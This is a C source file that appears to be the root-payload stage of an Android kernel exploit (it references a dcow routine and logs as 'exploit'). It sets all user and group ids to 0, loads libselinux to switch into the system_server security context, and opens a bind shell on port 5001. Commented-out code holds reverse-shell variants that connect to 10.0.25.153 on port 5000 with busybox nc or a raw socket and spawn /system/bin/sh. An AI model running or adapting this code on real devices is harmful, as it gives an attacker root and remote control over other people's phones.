#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>

#define PORT 5001

#include <dlfcn.h>
#include <fcntl.h>

#include "lsh.h"

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#elif PRINT
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#else
#define LOGV(...)
#endif

//reduce binary size
char __aeabi_unwind_cpp_pr0[0];

typedef int getcon_t(char ** con);
typedef int setcon_t(const char* con);

extern int dcow(int argc, const char *argv[]);

void lsh_loop();

void lsh_shell() {
	LOGV("lsh shell");
	int resultfd, sockfd;
	int port = 5001;
	struct sockaddr_in my_addr;

	// syscall 102
	// int socketcall(int call, unsigned long *args);

	// sycall socketcall (sys_socket 1)
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if(sockfd < 0)
	{
		LOGV("no socket\n");
		return;
	}
	// syscall socketcall (sys_setsockopt 14)
        int one = 1;
        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	memset(&my_addr,0,sizeof(my_addr));
	// set struct values
	my_addr.sin_family = AF_INET; // 2
	my_addr.sin_port = htons(port); // port number
	my_addr.sin_addr.s_addr = INADDR_ANY; // 0 fill with the local IP

	// syscall socketcall (sys_bind 2)
	bind(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));

	// syscall socketcall (sys_listen 4)
	listen(sockfd, 0);

	// syscall socketcall (sys_accept 5)
	resultfd = accept(sockfd, NULL, NULL);
	if(resultfd < 0)
	{
		LOGV("no resultfd\n");
		return;
	}
	// syscall 63
	dup2(resultfd, 2);
	dup2(resultfd, 1);
	dup2(resultfd, 0);
	LOGV("ciao\n");

	/*char * args[]={"/system/bin/sh", "/system/bin/sh", "-i", NULL};*/
	/*pid_t pid;*/
  /*int status;*/
  /*pid = fork();*/
  /*if (pid == 0) {*/
    /*// Child process*/
    /*if (execvp(args[0], args) == -1) {*/
			/*LOGV("execvp error");*/
    /*}*/
    /*exit(EXIT_FAILURE);*/
  /*} else if (pid < 0) {*/
    /*// Error forking*/
    /*LOGV("fork error");*/
  /*} else {*/
    /*// Parent process*/
    /*do {*/
      /*waitpid(pid, &status, WUNTRACED);*/
    /*} while (!WIFEXITED(status) && !WIFSIGNALED(status));*/
  /*}*/

	/*execvp(argv[0], argv);*/
	// syscall 11
	lsh_loop();

	LOGV("done exec uid %d", getuid());


}


int main(int argc, const char **argv)
{
	LOGV("uid %d", getuid());

	setuid(0);
	seteuid(0);
	setgid(0);
	setegid(0);
	if (setresgid(0, 0, 0) || setresuid(0, 0, 0)) {
		LOGV("setresgid/setresuid failed");
	}

	LOGV("uid %d", getuid());

	dlerror();
#ifdef __aarch64__
	void * selinux = dlopen("/system/lib64/libselinux.so", RTLD_LAZY);
#else
	void * selinux = dlopen("/system/lib/libselinux.so", RTLD_LAZY);
#endif
	if (selinux) {
		void * getcon = dlsym(selinux, "getcon");
		const char *error = dlerror();
		if (error) {
			LOGV("dlsym error %s", error);
		} else {
			getcon_t * getcon_p = (getcon_t*)getcon;
			char * secontext;
			int ret = (*getcon_p)(&secontext);
			LOGV("%d %s", ret, secontext);
			void * setcon = dlsym(selinux, "setcon");
			const char *error = dlerror();
			if (error) {
				LOGV("dlsym setcon error %s", error);
			} else {
				setcon_t * setcon_p = (setcon_t*)setcon;
				/*ret = (*setcon_p)("u:r:priv-app:s0");*/
				/*ret = (*setcon_p)("u:r:kernel:s0");*/
				/*ret = (*setcon_p)("u:r:system_app:s0");*/
				/*ret = (*setcon_p)("u:r:shell:s0");*/
				/*ret = (*setcon_p)("u:r:kernel:s0");*/
				ret = (*setcon_p)("u:r:system_server:s0");
				/*ret = (*setcon_p)("u:r:untrusted_app:s0");*/
				/*ret = (*setcon_p)("u:r:zygote:s0");*/
				/*if (ret == -1) ret = (*setcon_p)("u:r:shell:s0");*/
				/*ret = (*setcon_p)("u:r:ueventd:s0");*/
				/*ret = (*setcon_p)("u:r:adbd:s0");*/
				ret = (*getcon_p)(&secontext);
				LOGV("secontext %d %s", ret, secontext);
			}
		}
		dlclose(selinux);
	} else {
		LOGV("no selinux?");
	}

	/*const char * dcowargv[] = {argv[0], argv[0], "/sbin/adbd"};*/
	/*dcow(3, dcowargv);*/

	lsh_shell();

	/*char *const parmList[] = {"/system/bin/ls", "-l", "/", NULL};*/
	/*execv("/system/bin/ls", parmList);*/
	/*char *const parmList[] = {"/data/bin/tc", NULL};*/
	/*execv("/system/bin/tc", parmList);*/
	/*char *const parmList[] = {"/data/local/tmp/busybox", "nc", "10.0.25.153", "5000", NULL};*/
	/*execv("/data/local/tmp/busybox", parmList);*/

	/*int sock = socket(AF_INET, SOCK_STREAM, 0);*/
	/*struct sockaddr_in serv_addr = {0};*/
	/*serv_addr.sin_family = AF_INET;*/
	/*serv_addr.sin_port = htons(5000);*/
	/*serv_addr.sin_addr.s_addr = inet_addr("10.0.25.153");*/
	/*if(connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) != 0) {*/
		/*LOGV("could not connect");*/
	/*}*/
	/*dup2(sock, 0);*/
	/*dup2(sock, 1);*/
	/*dup2(sock, 2);*/
	/*execl("/system/bin/sh", "/system/bin/sh", "-i", NULL);*/

	/*while(1) {*/
		/*LOGV("moo");*/
		/*sleep(1);*/
	/*}*/

	/*system("/system/bin/tc");*/
	/*system("/system/bin/sh -i");*/

	/*if (argc == 1) {*/
		/*system("/system/bin/sh -i");*/
	/*} else {*/
		/*execv(argv[1], &argv[1]);*/
	/*}*/

}